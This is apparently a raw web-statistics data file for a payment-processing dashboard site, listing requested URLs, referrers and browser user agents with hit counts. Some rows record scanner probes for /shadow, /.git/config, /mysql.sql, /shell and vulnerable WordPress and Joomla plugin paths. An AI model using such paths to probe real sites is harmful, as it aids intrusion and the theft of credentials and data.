1	0	0	0	2	0	0	24576055	0	0	24524132	0	/typo3/
1	83	0	0	10	24833602	0	24767764	24435122	0	24767764	4720359	/css/animate.css
1	3	0	0	0	24832400	0	0	24734323	0	0	1404	/php/inc_viewagent.php?q=accinfo&iid=497
1	1	0	0	0	24436412	0	0	24436412	0	0	468	/php/inc_viewagent.php?q=accinfo&iid=507
1	1	0	0	0	24832412	0	0	24832412	0	0	468	/php/inc_viewagent.php?q=accinfo&iid=505
1	1	0	0	0	24639213	0	0	24639213	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1478280830343
1	1	0	0	0	24734322	0	0	24734322	0	0	468	/php/inc_viewagent.php?q=accinfo&iid=503
1	31	0	0	0	24833602	0	0	24435122	0	0	33408	/favicon/favicon-16x16.png
1	1	0	0	0	24776184	0	0	24776184	0	0	84247	/js/jquery-2.1.1.js?_=1486502633911
1	5	0	0	0	24734324	0	0	24643406	0	0	2340	/php/inc_viewagent.php?q=accinfo&iid=502
1	1	0	0	0	24643406	0	0	24643406	0	0	468	/php/inc_viewagent.php?q=accinfo&iid=492
1	1	0	0	0	24832389	0	0	24832389	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1489871306422
1	1	0	0	0	24435184	0	0	24435184	0	0	468	/php/inc_viewagent.php?q=accinfo&iid=491
1	1	0	0	0	24832392	0	0	24832392	0	0	84247	/js/jquery-2.1.1.js?_=1489871474889
1	1	0	0	0	24766346	0	0	24766346	0	0	468	/php/inc_viewagent.php?q=accinfo&iid=488
1	1	0	0	0	24764567	0	0	24764567	0	0	84247	/js/jquery-2.1.1.js?_=1485805596920
1	3	0	0	0	24766346	0	0	24643404	0	0	1404	/php/inc_viewagent.php?q=accinfo&iid=487
1	1	0	0	0	24639243	0	0	24639243	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1478282655315
1	1	0	0	0	24764585	0	0	24764585	0	0	434957	/js/plugins/dataTables/jquery.dataTables.js?_=1485806708069
1	1	0	0	0	24643405	0	0	24643405	0	0	468	/php/inc_viewagent.php?q=accinfo&iid=483
1	4	0	0	0	24832392	0	0	24643405	0	0	1872	/php/inc_viewagent.php?q=accinfo&iid=482
1	0	0	0	1	0	0	24587202	0	0	24587202	0	/wp-content/
1	2	0	0	0	24643408	0	0	24643408	0	0	1270	/php/inc_viewagent.php?q=accinfo&agentid=20&merchantid=
1	11	0	0	0	24832404	0	0	24436290	0	0	9317	/php/inc_viewagent.php?q=accinfo&agentid=19&merchantid=
1	8	0	0	0	24820787	0	0	24436412	0	0	3744	/php/inc_viewagent.php?q=accinfo&iid=476
1	15	0	0	0	24816454	0	0	24435142	0	0	18928	/css/plugins/iCheck/custom.css
1	8	0	0	0	24832390	0	0	24436409	0	0	5944	/php/inc_chart-view.php?q=processors
1	5	0	0	0	24643408	0	0	24643406	0	0	2340	/php/inc_viewagent.php?q=accinfo&iid=473
1	0	0	0	1	0	0	24598618	0	0	24598618	0	/robots.txt?207.46.13.178
1	13	0	0	0	24832390	0	0	24435184	0	0	179532	/js/datetimepicker/jquery.datetimepicker.css
1	5	0	0	0	24776194	0	0	24734082	0	0	2340	/php/inc_viewagent.php?q=accinfo&iid=469
1	1	0	0	0	24436290	0	0	24436290	0	0	468	/php/inc_viewagent.php?q=accinfo&iid=470
1	1	0	0	0	24776189	0	0	24776189	0	0	31619	/js/plugins/dataTables/dataTables.tableTools.min.js?_=1486502920010
1	5	0	0	0	24643407	0	0	24639245	0	0	2340	/php/inc_viewagent.php?q=accinfo&iid=468
1	8	0	0	0	24764570	0	0	24639244	0	0	3744	/php/inc_viewagent.php?q=accinfo&iid=467
1	10	0	0	0	24819499	0	0	24435184	0	0	4680	/php/inc_viewagent.php?q=accinfo&iid=466
1	8	0	0	0	24764570	0	0	24639244	0	0	5016	/php/inc_viewagent.php?q=accinfo&agentid=7&merchantid=
1	1	0	0	0	24766346	0	0	24766346	0	0	84247	/js/jquery-2.1.1.js?_=1485912345067
1	2	0	0	0	24643407	0	0	24435331	0	0	1060	/php/inc_viewagent.php?q=processors&agentid=13&merchantid=
1	18	0	0	0	24832384	0	0	24435142	0	0	1347952	/js/jquery-2.1.1.js
1	0	0	0	1	0	0	24434988	0	0	24434988	0	/mysql.sql
1	1	0	0	0	24832392	0	0	24832392	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1489871474892
1	1	0	0	0	24832389	0	0	24832389	0	0	434957	/js/plugins/dataTables/jquery.dataTables.js?_=1489871300570
1	0	0	0	1	0	0	24434988	0	0	24434988	0	/shadow
1	1	0	0	0	24734308	0	0	24734308	0	0	434957	/js/plugins/dataTables/jquery.dataTables.js?_=1483990105110
1	13	0	0	0	24832392	0	0	24435150	0	0	379428	/js/plugins/dataTables/dataTables.tableTools.min.js
1	15	0	0	0	24816454	0	0	24435142	0	0	85813	/css/plugins/dataTables/dataTables.tableTools.min.css
1	0	0	0	10	0	0	24591937	0	0	24449761	0	/administrator/
1	0	0	0	25	0	0	24832411	0	0	24435185	0	/css/plugins/images/sort_both.png
1	13	0	0	0	24832404	0	0	24435169	0	0	142601	/merchantapi.php
1	7	0	0	0	24832391	0	0	24436409	0	0	421785	/img/chargebackbyvolume.jpg
1	0	0	0	1	0	0	24581383	0	0	24581383	0	/.git/
1	1	0	0	0	24832397	0	0	24832397	0	0	46821	/js/plugins/datapicker/bootstrap-datepicker.js?_=1489871753434
1	1	0	0	0	24832412	0	0	24832412	0	0	530	/php/inc_viewagent.php?q=processors&agentid=23&merchantid=
1	4	0	0	0	24764585	0	0	24639243	0	0	5984	/php/inc_viewagent.php?q=accinfo&agentid=12&merchantid=
1	11	0	0	0	24832397	0	0	24435185	0	0	134719	/processormerchantmanager.php
1	18	0	0	0	24832384	0	0	24435142	0	0	221712	/js/plugins/staps/jquery.steps.min.js
1	1	0	0	0	24766346	0	0	24766346	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1485912345070
1	2	0	0	0	24435689	0	0	24435687	0	0	29777	/user.php?userid=520
1	2	0	0	0	24435147	0	0	24435146	0	0	29979	/user.php?userid=518
1	1	0	0	0	24832400	0	0	24832400	0	0	973	/phpexcel/report.php?date=03/19/2017
1	0	0	0	1	0	0	24434988	0	0	24434988	0	/shell
1	1	0	0	0	24573826	0	0	24573826	0	0	4753	/favicon/apple-icon-72x72.png
1	0	0	0	1	0	0	24434977	0	0	24434977	0	/digestshadow
1	1	0	0	0	24682290	0	0	24682290	0	0	25039	/php/inc_viewagent.php?q=editagentinfo&agentid=&merchantid=14
1	19	0	0	0	24765820	0	0	24435170	0	0	954	/php/inc_merchantprocessors.php
1	8	0	0	0	24832390	0	0	24436409	0	0	400880	/img/chargeback.jpg
1	5	0	0	0	24832411	0	0	24435169	0	0	12134	/php/inc_viewagent.php?q=accinfo&agentid=22&merchantid=
1	3	0	0	0	24435174	0	0	24435130	0	0	85723	/hashpass.php
1	15	0	0	0	24816454	0	0	24435142	0	0	175370	/css/plugins/chosen/chosen.css
1	1	0	0	0	24435690	0	0	24435690	0	0	7708	/css/plugins/iCheck/green@2x.png
1	27	0	0	0	24832397	0	0	24435184	0	0	531880	/reports.php
1	7	0	0	0	24832391	0	0	24436409	0	0	5257	/php/inc_chart-view.php?q=fee
1	0	0	0	2	0	0	24556378	0	0	24508286	0	/xmlrpc.php
1	0	0	0	1	0	0	24459133	0	0	24459133	0	/wp-login.php?108.162.223.131
1	10	0	0	0	24832399	0	0	24435149	0	0	6728	/php/inc_viewagent.php?q=accinfo&agentid=9&merchantid=
1	12	0	0	0	24832392	0	0	24639213	0	0	124942	/merchantreports.php
1	1	0	0	0	24573826	0	0	24573826	0	0	3943	/favicon/apple-icon-60x60.png
1	1	0	0	0	24764585	0	0	24764585	0	0	84247	/js/jquery-2.1.1.js?_=1485806708068
1	1	0	0	0	24816459	0	0	24816459	0	0	434957	/js/plugins/dataTables/jquery.dataTables.js?_=1488919107720
1	0	0	0	4	0	0	24571895	0	0	24438645	0	/register.html
1	0	0	0	1	0	0	24570471	0	0	24570471	0	/.git/config
1	5	0	0	0	24776189	0	0	24435170	0	0	88820	/chargebacks.php
1	1	0	0	0	24436290	0	0	24436290	0	0	2517	/php/inc_viewagent.php?q=agentinfo&agentid=10&merchantid=
1	1	0	0	0	24832389	0	0	24832389	0	0	24986	/php/inc_viewagent.php?q=editagentinfo&agentid=&merchantid=3
1	18	0	0	0	24832384	0	0	24435142	0	0	134928	/js/plugins/tabelizer/jquery.tabelizer.js
1	0	0	0	1	0	0	24580483	0	0	24580483	0	/wp-content/plugins/dzs-zoomsounds/admin/admin.js
1	17	0	0	0	24820787	0	0	24436412	0	0	10710	/php/inc_viewagent.php?q=accinfo&agentid=14&merchantid=
1	8	0	0	0	24832411	0	0	24734315	0	0	36345	/php/inc_processoredit.php
1	1	0	0	0	24435185	0	0	24435185	0	0	21587	/js/plugins/validate/jquery.validate.min.js?_=1466039369386
1	0	0	4	0	0	24576055	0	0	24524132	0	0	/index.php/login.php
1	1	0	0	0	24832389	0	0	24832389	0	0	84247	/js/jquery-2.1.1.js?_=1489871300569
1	1	0	0	0	24734308	0	0	24734308	0	0	84247	/js/jquery-2.1.1.js?_=1483990105109
1	18	0	0	0	24832384	0	0	24435142	0	0	554448	/js/bootstrap.min.js
1	1	0	0	0	24497469	0	0	24497469	0	0	137733	/css/patterns/shattered.png
1	1	0	0	0	24764585	0	0	24764585	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1485806708071
1	1	0	0	0	24734319	0	0	24734319	0	0	184	/php/inc_cbdocuments.php
1	15	0	0	0	24816454	0	0	24435142	0	0	67314	/css/plugins/dataTables/dataTables.bootstrap.css
1	1	0	0	0	24734315	0	0	24734315	0	0	46821	/js/plugins/datapicker/bootstrap-datepicker.js?_=1483990523222
1	1	0	0	0	24436290	0	0	24436290	0	0	2555	/php/inc_viewagent.php?q=agentinfo&agentid=19&merchantid=
1	1	0	0	0	24573826	0	0	24573826	0	0	8987	/favicon/apple-icon-120x120.png
1	1	0	0	0	24734308	0	0	24734308	0	0	9614	/js/plugins/dataTables/dataTables.bootstrap.js?_=1483990104637
1	9	0	0	4	24832405	0	24435117	24436378	0	24434963	340536	/favicon.ico
1	1	0	0	0	24766346	0	0	24766346	0	0	12322	/viewagent.php?merchantid=9
1	1	0	0	0	24766346	0	0	24766346	0	0	10931	/viewagent.php?merchantid=8
1	1	0	0	0	24816457	0	0	24816457	0	0	46821	/js/plugins/datapicker/bootstrap-datepicker.js?_=1488918974905
1	0	0	0	3	0	0	24434990	0	0	24434977	0	/addons
1	15	0	0	0	24832390	0	0	24435186	0	0	121512	/php/inc_reportsearch.php
1	7	0	0	0	24832391	0	0	24436409	0	0	5271	/php/inc_chart-view.php?q=affstatus
1	1	0	0	0	24832389	0	0	24832389	0	0	12322	/viewagent.php?merchantid=3
1	1	0	0	0	24573826	0	0	24573826	0	0	3662	/favicon/apple-icon-57x57.png
1	19	0	0	0	24832381	0	0	24435122	0	0	33966	/favicon/favicon-32x32.png
1	1	0	0	0	24682284	0	0	24682284	0	0	9614	/js/plugins/dataTables/dataTables.bootstrap.js?_=1480868701172
1	1	0	0	0	24435146	0	0	24435146	0	0	12321	/viewagent.php?merchantid=1
1	3	0	0	0	24573826	0	0	24440107	0	0	1440	/favicon/manifest.json
1	1	0	0	0	24776184	0	0	24776184	0	0	46821	/js/plugins/datapicker/bootstrap-datepicker.js?_=1486502633912
1	2	0	0	0	24435713	0	0	24435150	0	0	872	/css/plugins/chosen/chosen-sprite@2x.png
1	1	0	0	0	24734314	0	0	24734314	0	0	25050	/php/inc_viewagent.php?q=editagentinfo&agentid=28&merchantid=
1	1	0	0	0	24764567	0	0	24764567	0	0	46821	/js/plugins/datapicker/bootstrap-datepicker.js?_=1485805596921
1	0	0	20	0	0	24833602	0	0	24594326	0	0	/?207.46.13.178
1	1	0	0	0	24832389	0	0	24832389	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1489871300572
1	3	3	0	0	24435000	0	0	24434977	0	0	672	/userconfig/
1	1	0	0	0	24643413	0	0	24643413	0	0	17471	/transactiondetails.php?t_id=5546468
1	1	0	0	0	24734308	0	0	24734308	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1483990105112
1	18	0	0	0	24832384	0	0	24435142	0	0	815216	/js/plugins/chartJs/Chart.min.js
1	0	0	8	0	0	24832393	0	0	24436414	0	0	/transactiondetails.php?t_id=5546465
1	1	0	0	0	24776219	0	0	24776219	0	0	9614	/js/plugins/dataTables/dataTables.bootstrap.js?_=1486504686805
1	7	0	0	0	24832397	0	0	24435186	0	0	6578	/php/inc_admin_mpg_fees.php
1	1	0	0	0	24435185	0	0	24435185	0	0	4998	/js/plugins/iCheck/icheck.min.js?_=1466039369387
1	0	0	0	1	0	0	24441128	0	0	24441128	0	/wp-content/plugins/revslider/js/rev_admin.js
1	312	0	46	0	24833735	24832408	0	24435122	24435142	0	967502	/login.php
1	266	0	1	0	24832412	24435713	0	24435142	24435713	0	5001560	/dashboard.php
1	1	0	0	0	24639243	0	0	24639243	0	0	2519	/php/inc_viewagent.php?q=agentinfo&agentid=12&merchantid=
1	4	0	0	0	24776209	0	0	24435186	0	0	496	/php/inc_agentmerchants.php
1	23	0	0	0	24833602	0	0	24435122	0	0	133843	/favicon/favicon-96x96.png
1	2	0	0	0	24832408	0	0	24776213	0	0	1280	/php/inc_viewagent.php?q=accinfo&agentid=&merchantid=16
1	3	0	0	0	24435195	0	0	24435147	0	0	1902	/php/inc_viewagent.php?q=accinfo&agentid=&merchantid=15
1	0	0	0	3	0	0	24435119	0	0	24434977	0	/homedir/
1	14	0	0	0	24832400	0	0	24639212	0	0	8792	/php/inc_viewagent.php?q=accinfo&agentid=&merchantid=14
1	1	0	0	0	24734308	0	0	24734308	0	0	31619	/js/plugins/dataTables/dataTables.tableTools.min.js?_=1483990104639
1	1	0	0	0	24776189	0	0	24776189	0	0	434957	/js/plugins/dataTables/jquery.dataTables.js?_=1486502920007
1	1	0	0	0	24643406	0	0	24643406	0	0	629	/php/inc_viewagent.php?q=accinfo&agentid=&merchantid=13
1	0	0	0	12	0	0	24588379	0	0	24442937	0	/administrator/index.php
1	13	0	0	0	24832392	0	0	24435150	0	0	394368	/js/plugins/dataTables/dataTables.responsive.js
1	1	0	0	0	24682284	0	0	24682284	0	0	31619	/js/plugins/dataTables/dataTables.tableTools.min.js?_=1480868701174
1	0	0	0	1	0	0	24434988	0	0	24434988	0	/sds
1	1	0	0	0	24436290	0	0	24436290	0	0	530	/php/inc_viewagent.php?q=processors&agentid=10&merchantid=
1	1	0	0	0	24639213	0	0	24639213	0	0	9614	/js/plugins/dataTables/dataTables.bootstrap.js?_=1478280830342
1	1	0	0	0	24832411	0	0	24832411	0	0	4998	/js/plugins/iCheck/icheck.min.js?_=1489872613340
1	1	0	0	0	24734315	0	0	24734315	0	0	1732	/php/inc_processorstable.php
1	1	0	0	0	24816459	0	0	24816459	0	0	84247	/js/jquery-2.1.1.js?_=1488919107719
1	16	16	586	2	24435117	24833735	24767763	24434959	24435122	24767763	14027	/
1	1	0	0	0	24832389	0	0	24832389	0	0	9614	/js/plugins/dataTables/dataTables.bootstrap.js?_=1489871306421
1	2	0	0	0	24776197	0	0	24435169	0	0	5118	/php/inc_viewagent.php?q=agentinfo&agentid=22&merchantid=
1	12	0	0	0	24832406	0	0	24643423	0	0	7596	/php/inc_viewagent.php?q=accinfo&agentid=26&merchantid=
1	1	0	0	0	24639243	0	0	24639243	0	0	9614	/js/plugins/dataTables/dataTables.bootstrap.js?_=1478282655314
1	1	0	0	0	24776219	0	0	24776219	0	0	31619	/js/plugins/dataTables/dataTables.tableTools.min.js?_=1486504686807
1	1	0	0	0	24682279	0	0	24682279	0	0	21587	/js/plugins/validate/jquery.validate.min.js?_=1480868385351
1	14	0	0	0	24832392	0	0	24435187	0	0	34842	/php/inc_cbsearch.php
1	15	0	0	0	24832397	0	0	24435150	0	0	887372	/virtualterminal.php
1	28	0	0	0	24832406	0	0	24435148	0	0	89068	/login.php?logout=true
1	1	0	0	0	24643408	0	0	24643408	0	0	530	/php/inc_viewagent.php?q=processors&agentid=20&merchantid=
1	1	0	0	0	24734322	0	0	24734322	0	0	530	/php/inc_viewagent.php?q=processors&agentid=19&merchantid=
1	15	0	0	0	24816454	0	0	24435142	0	0	150059	/css/plugins/dropzone/dropzone.css
1	18	0	0	0	24832384	0	0	24435142	0	0	5392	/css/plugins/treegrid/jquery.treegrid.css
1	1	0	0	0	24573826	0	0	24573826	0	0	16666	/favicon/apple-icon-180x180.png
1	10	0	0	0	24832396	0	0	24435184	0	0	5814	/css/plugins/chosen/chosen-sprite.png
1	0	0	0	2	0	0	24435116	0	0	24435000	0	/homedir_paths
1	18	0	0	0	24832384	0	0	24435142	0	0	75376	/js/plugins/slimscroll/jquery.slimscroll.min.js
1	1	0	0	0	24467860	0	0	24467860	0	0	2380	/forgot-password.php?108.162.223.131
1	1	0	0	0	24734319	0	0	24734319	0	0	10208	/css/plugins/images/spritemap.png
1	1	0	0	0	24816459	0	0	24816459	0	0	32864	/js/plugins/dataTables/dataTables.responsive.js?_=1488919107722
1	0	0	0	17	0	0	24591937	0	0	24449761	0	/wp-login.php
1	3	0	0	0	24776194	0	0	24435150	0	0	1590	/php/inc_viewagent.php?q=processors&agentid=9&merchantid=
1	1	0	0	0	24832392	0	0	24832392	0	0	9614	/js/plugins/dataTables/dataTables.bootstrap.js?_=1489871474891
1	15	0	0	0	24816454	0	0	24435142	0	0	34138	/css/plugins/dataTables/dataTables.responsive.css
1	1	0	0	0	24766346	0	0	24766346	0	0	628	/php/inc_viewagent.php?q=accinfo&agentid=&merchantid=9
1	1	0	0	0	24639213	0	0	24639213	0	0	31619	/js/plugins/dataTables/dataTables.tableTools.min.js?_=1478280830344
1	1	0	0	0	24766346	0	0	24766346	0	0	628	/php/inc_viewagent.php?q=accinfo&agentid=&merchantid=8
1	4	0	0	0	24765825	0	0	24436412	0	0	10080	/php/inc_viewagent.php?q=agentinfo&agentid=14&merchantid=
1	0	0	1	0	0	24589912	0	0	24589912	0	0	/index.php?option=com_breezingforms
1	1	0	0	0	24573826	0	0	24573826	0	0	12537	/favicon/apple-icon-152x152.png
1	1	0	0	0	24832389	0	0	24832389	0	0	31619	/js/plugins/dataTables/dataTables.tableTools.min.js?_=1489871306423
1	2	0	0	0	24832389	0	0	24832389	0	0	1288	/php/inc_viewagent.php?q=accinfo&agentid=&merchantid=3
1	1	0	0	0	24435146	0	0	24435146	0	0	628	/php/inc_viewagent.php?q=accinfo&agentid=&merchantid=1
1	1	0	0	0	24573826	0	0	24573826	0	0	8469	/favicon/apple-icon-114x114.png
1	18	0	0	0	24832411	0	0	24435185	0	0	318993	/processors.php
1	9	0	0	0	24832393	0	0	24436414	0	0	786069	/js/plugins/dropzone/dropzone.js
2	30	0	4	30	24767764	24767764	24767764	24767763	24767763	24767764	347105	dn
3	1	1	0	0	24434977	0	0	24434977	0	0	1081	http://www.rebanx.com/userconfig/
3	15	0	0	0	24734322	0	0	24435150	0	0	615664	http://rebanx.com/transactions.php
3	0	0	0	1	0	0	24449761	0	0	24449761	0	http://rebanx.com/administrator/
3	0	0	5	0	0	24605993	0	0	24470900	0	0	http://www.netcraft.com/survey/
3	2	0	0	0	24832405	0	0	24820786	0	0	85134	http://rebanx.com/api/API-MerchantManual(Version 1.0).pdf
3	3	0	0	0	24766346	0	0	24766346	0	0	14709	http://rebanx.com/viewagent.php?merchantid=9
3	3	0	0	0	24766346	0	0	24766346	0	0	14709	http://rebanx.com/viewagent.php?merchantid=8
3	5	0	0	0	24776192	0	0	24436415	0	0	170268	http://rebanx.com/create-zip.php?t_id=5546466
3	5	0	0	0	24598435	0	0	24598435	0	0	315181	http://www.rebanx.com/login.php
3	13	3	4	22	24597139	24548048	24435119	24434988	24452225	24434988	29490	http://rebanx.com/
3	7	0	0	0	24832389	0	0	24832389	0	0	43416	http://rebanx.com/viewagent.php?merchantid=3
3	2	0	0	0	24434989	0	0	24434988	0	0	213676050	http://rebanx.com/rebanx.com/
3	4	1	0	0	24435690	0	0	24435690	0	0	47210	http://rebanx.com/user.php?userid=520
3	2	0	0	0	24435146	0	0	24435146	0	0	28568	http://rebanx.com/viewagent.php?merchantid=1
3	2	0	0	0	24435147	0	0	24435146	0	0	51554	http://rebanx.com/user.php?userid=518
3	12	0	0	0	24832393	0	0	24435185	0	0	58348	http://rebanx.com/css/plugins/iCheck/custom.css
3	25	0	0	0	24832384	0	0	24435142	0	0	1309040	http://rebanx.com/font-awesome/css/font-awesome.css
3	54	0	15	9	24832406	24832406	24767764	24435148	24435148	24767764	1544849	http://rebanx.com/login.php?logout=true
3	5	0	0	0	24765825	0	0	24435690	0	0	123114	http://rebanx.com/user.php
3	5	0	0	0	24832408	0	0	24776213	0	0	34341	http://rebanx.com/viewagent.php?merchantid=16
3	9	1	0	0	24435331	0	0	24435147	0	0	43827	http://rebanx.com/viewagent.php?merchantid=15
3	42	0	0	0	24832400	0	0	24639212	0	0	214005	http://rebanx.com/viewagent.php?merchantid=14
3	3	0	0	0	24643406	0	0	24643406	0	0	14712	http://rebanx.com/viewagent.php?merchantid=13
3	70	0	0	0	24832397	0	0	24435185	0	0	1721689	http://rebanx.com/processormerchantmanager.php
3	14	0	5	0	24832405	24832405	0	24435170	24766346	0	2049887	http://rebanx.com/merchantapi.php
3	29	0	0	0	24832398	0	0	24435150	0	0	479664	http://rebanx.com/virtualterminal.php
3	0	0	1	0	0	24496711	0	0	24496711	0	0	https://www.google.com/
3	91	0	3	0	24832395	24832390	0	24639213	24734309	0	8176405	http://rebanx.com/merchantreports.php
3	690	15	31	6	24832412	24832409	24767764	24435142	24435146	24767764	13374804	http://rebanx.com/dashboard.php
3	1	1	0	0	24435117	0	0	24435117	0	0	1033	http://www.google.com/search
3	3	3	0	0	24435030	0	0	24434988	0	0	3147	http://rebanx.com/userconfig/
3	0	0	0	1	0	0	24508286	0	0	24508286	0	https://google.com/
3	1	0	0	0	24639247	0	0	24639247	0	0	3181	http://rebanx.com/forgot-password.php
3	83	0	0	0	24832406	0	0	24435186	0	0	271940	http://rebanx.com/fees.php
3	1	0	0	0	24734319	0	0	24734319	0	0	10208	http://rebanx.com/css/plugins/dropzone/dropzone.css
3	7	0	7	0	24594083	24594083	0	24455165	24455165	0	22267	http://whois.domaintools.com/rebanx.com
3	9	0	0	0	24734315	0	0	24734314	0	0	86997	http://rebanx.com/viewagent.php?agentid=28
3	61	0	13	0	24832394	24832394	0	24436414	24436414	0	1570525	http://rebanx.com/chargeback.php?cb_id=4
3	1	0	0	0	24497469	0	0	24497469	0	0	3181	http://www.rebanx.com/forgot-password.php
3	1	0	0	0	24593387	0	0	24593387	0	0	3181	://rebanx.com
3	34	0	0	0	24832406	0	0	24643423	0	0	177614	http://rebanx.com/viewagent.php?agentid=26
3	15	0	2	0	24832399	24832399	0	24643407	24643407	0	101833	http://rebanx.com/viewagent.php?agentid=25
3	9	0	1	0	24832412	24832412	0	24832412	24832412	0	52245	http://rebanx.com/viewagent.php?agentid=23
3	17	0	0	0	24832412	0	0	24435169	0	0	144288	http://rebanx.com/viewagent.php?agentid=22
3	0	0	0	1	0	0	24449761	0	0	24449761	0	http://rebanx.com/wp-login.php
3	14	0	1	0	24734324	24643406	0	24643406	24643406	0	76788	http://rebanx.com/viewagent.php?agentid=21
3	32	0	0	0	24832404	0	0	24436290	0	0	156509	http://rebanx.com/viewagent.php?agentid=19
3	6	0	0	0	24643408	0	0	24643408	0	0	26216	http://rebanx.com/viewagent.php?agentid=20
3	59	0	0	0	24832411	0	0	24435185	0	0	2918358	http://rebanx.com/processors.php
3	90	0	8	0	24832411	24832395	0	24435169	24643405	0	4251641	http://rebanx.com/chargebacks.php?type=cb
3	353	0	31	15	24833602	24832408	24767764	24435122	24435142	24767764	14340291	http://rebanx.com/login.php
3	46	0	3	0	24820790	24820790	0	24436412	24643404	0	254633	http://rebanx.com/viewagent.php?agentid=14
3	0	0	0	1	0	0	24587202	0	0	24587202	0	http://rebants.com/wp-content/
3	20	0	0	0	24643408	0	0	24435331	0	0	134887	http://rebanx.com/viewagent.php?agentid=13
3	11	0	0	0	24764585	0	0	24639243	0	0	65682	http://rebanx.com/viewagent.php?agentid=12
3	11	0	0	0	24643405	0	0	24435184	0	0	111130	http://rebanx.com/viewagent.php?agentid=11
3	8	0	0	0	24436290	0	0	24436290	0	0	58471	http://rebanx.com/viewagent.php?agentid=10
3	20	0	0	0	24832384	0	0	24435142	0	0	105786	http://rebanx.com/css/style.css
3	12	0	0	0	24832396	0	0	24435150	0	0	6686	http://rebanx.com/css/plugins/chosen/chosen.css
3	1	0	1	0	24576623	24576623	0	24576623	24576623	0	3181	https://www.google.ro/
3	1	0	1	0	24460085	24460085	0	24460085	24460085	0	3181	http://mlicnak.top/blog/
3	5	0	0	0	24776190	0	0	24435170	0	0	51463	http://rebanx.com/chargebacks.php
3	7	1	0	5	24497469	0	24434977	24434977	0	24434963	304373	http://www.rebanx.com/
3	8	0	3	0	24832406	24832406	0	24764570	24776196	0	200488	http://rebanx.com/addmerchant.php
3	32	0	0	0	24832399	0	0	24435149	0	0	191371	http://rebanx.com/viewagent.php?agentid=9
3	23	0	1	0	24816456	24643407	0	24639244	24643407	0	130972	http://rebanx.com/viewagent.php?agentid=8
3	24	0	0	0	24764570	0	0	24639244	0	0	147143	http://rebanx.com/viewagent.php?agentid=7
3	23	0	0	0	24819499	0	0	24435145	0	0	132792	http://rebanx.com/viewagent.php?agentid=6
3	140	0	1	0	24832397	24639245	0	24435184	24639245	0	5111817	http://rebanx.com/reports.php
3	54	0	2	0	24832392	24436290	0	24435145	24435713	0	677183	http://rebanx.com/users.php
3	32	0	3	0	24832411	24643411	0	24435184	24436413	0	865942	http://rebanx.com/addagent.php
3	1	0	0	0	24643423	0	0	24643423	0	0	18912	http://rebanx.com/transactiondetails.php?t_id=5546468
3	1	0	1	0	24557987	24557987	0	24557987	24557987	0	3181	http://burger-imperia.com/
3	0	0	0	1	0	0	24581383	0	0	24581383	0	http://rebanx.com/.git/
3	11	0	0	25	24832392	0	24832411	24435185	0	24435185	10170	http://rebanx.com/css/plugins/dataTables/dataTables.bootstrap.css
4	0	0	5	0	0	24605993	0	0	24470900	0	0	Mozilla/4.0 (compatible; Netcraft Web Server Survey)
4	2	0	1	0	24517824	24517824	0	24517824	24517824	0	5561	Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
4	0	0	0	1	0	0	24580483	0	0	24580483	0	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; MRA 4.6 (build 01425))
4	4	1	0	1	24435174	0	24435117	24435117	0	24435117	6337	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon
4	4	0	4	0	24473549	24473549	0	24444750	24444750	0	12724	Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:11.0) Gecko/20100101 Firefox/11.0
4	1	0	0	0	24497469	0	0	24497469	0	0	114011	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
4	8	0	6	4	24572984	24572984	24572984	24441190	24441190	24441190	22244	Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0; ips-agent) Gecko/20100101 Firefox/14.0.1
4	0	0	9	0	0	24567610	0	0	24476556	0	0	Netcraft SSL Server Survey - contact info@netcraft.com
4	1	0	1	0	24437045	24437045	0	24437045	24437045	0	3181	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0
4	1	0	1	0	24591308	24591308	0	24591308	24591308	0	3181	python-requests/2.11.1
4	1	0	1	0	24444911	24444911	0	24444911	24444911	0	3181	Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1
4	1	0	1	0	24511710	24511710	0	24511710	24511710	0	3181	GuzzleHttp/6.2.1 curl/7.47.0 PHP/7.0.8-0ubuntu0.16.04.2
4	1	1	32	0	24434959	24597026	0	24434959	24445448	0	0	Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online)
4	2	0	1	0	24497469	24497469	0	24497469	24497469	0	36213	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36
4	1	0	1	0	24500395	24500395	0	24500395	24500395	0	3181	Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.694.0 Safari/534.24
4	267	5	11	9	24460085	24460085	24436414	24434963	24435169	24434963	4040120	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36
4	0	0	1	0	0	24496711	0	0	24496711	0	0	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
4	1	0	0	0	24497469	0	0	24497469	0	0	89487	Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36
4	30	0	5	0	24571331	24571331	0	24548203	24548203	0	628986	Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
4	1	0	1	0	24460675	24460675	0	24460675	24460675	0	3181	Mozilla/5.0 (X11; CrOS i686 12.433.216) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.105 Safari/534.30
